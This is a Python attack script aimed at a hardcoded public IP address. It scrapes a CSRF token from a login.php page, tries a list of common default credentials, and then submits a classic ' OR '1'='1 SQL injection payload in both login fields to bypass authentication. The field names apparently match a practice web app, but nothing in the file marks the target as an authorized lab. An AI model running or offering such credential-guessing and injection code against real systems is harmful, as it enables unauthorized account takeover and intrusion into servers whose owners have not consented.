
import requests
import re
from urllib.parse import urljoin

target_url = "http://31.97.117.123"

# Common default credentials to test
credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("user", "password"),
    ("user", "user"),
    ("root", "root"),
    ("test", "test"),
    ("guest", "guest"),
    ("administrator", "administrator"),
    ("admin", "admin123"),
]

session = requests.Session()

# Get the login page first to extract the CSRF token
print("[*] Fetching login page...")
login_page = session.get(f"{target_url}/login.php")
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([a-f0-9]+)['\"]", login_page.text)
user_token = token_match.group(1) if token_match else None
print(f"[*] Found token: {user_token}")

# Test credentials
attempts = 0
for username, password in credentials:
    attempts += 1
    print(f"\n[{attempts}] Testing: {username}:{password}")
    
    payload = {
        "username": username,
        "password": password,
        "user_token": user_token,
        "Login": "Login"
    }
    
    response = session.post(f"{target_url}/login.php", data=payload, allow_redirects=False)
    
    if "login" not in response.text.lower() or "302" in str(response.status_code):
        print(f"[+] Possible success! Status: {response.status_code}")
        print(f"[+] Location: {response.headers.get('Location', 'N/A')}")
        if "index.php" in response.headers.get('Location', ''):
            print(f"[+] SUCCESS! Credentials: {username}:{password}")
            break
    else:
        print(f"[-] Failed")
    
    if attempts >= 10:
        print("\n[!] Reached 10 attempts limit")
        break

print("\n[*] Attempting SQL Injection on login...")
# Try basic SQL injection
sqli_payload = {
    "username": "' OR '1'='1",
    "password": "' OR '1'='1",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(f"{target_url}/login.php", data=sqli_payload, allow_redirects=False)
print(f"[*] SQL Injection test status: {response.status_code}")
if "302" in str(response.status_code):
    print("[+] SQL Injection may have worked!")

